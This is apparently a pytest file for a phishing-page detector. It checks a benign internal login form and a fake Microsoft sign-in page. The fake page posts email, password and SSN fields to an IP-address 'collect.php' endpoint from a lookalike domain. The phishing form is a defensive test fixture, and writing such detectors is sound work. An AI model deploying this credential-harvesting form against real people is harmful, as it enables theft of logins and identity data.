import pytest
from app.scanner.phishing.fake_login import FakeLoginPageDetector


def test_benign_login_page_detection():
    detector = FakeLoginPageDetector()
    benign_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Company Internal Portal</title></head>
      <body>
        <form action="/login" method="POST">
          <input type="text" name="username" />
          <input type="password" name="password" />
          <button type="submit">Sign In</button>
        </form>
      </body>
    </html>
    """
    result = detector.inspect_page("https://portal.mycompany.com/auth", benign_html)
    assert result["has_login_form"] is True
    assert result["cross_origin_submission"] is False
    assert result["brand_mismatch"] is False
    assert result["risk_level"] in ["clean", "suspicious"]


def test_phishing_brand_impersonation_detection():
    detector = FakeLoginPageDetector()
    phishing_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Sign in to your Microsoft account</title></head>
      <body>
        <form action="http://192.168.1.50/collect.php" method="POST">
          <input type="email" name="loginfmt" placeholder="someone@example.com" />
          <input type="password" name="passwd" />
          <input type="text" name="ssn" />
          <button type="submit">Next</button>
        </form>
      </body>
    </html>
    """
    result = detector.inspect_page("https://secure-login-verify-update.com/ms/", phishing_html)
    assert result["has_login_form"] is True
    assert result["brand_mismatch"] is True
    assert result["impersonated_brand"] == "microsoft"
    assert result["cross_origin_submission"] is True
    assert result["action_is_ip"] is True
    assert result["risk_level"] == "critical"
    assert len(result["indicators"]) >= 3
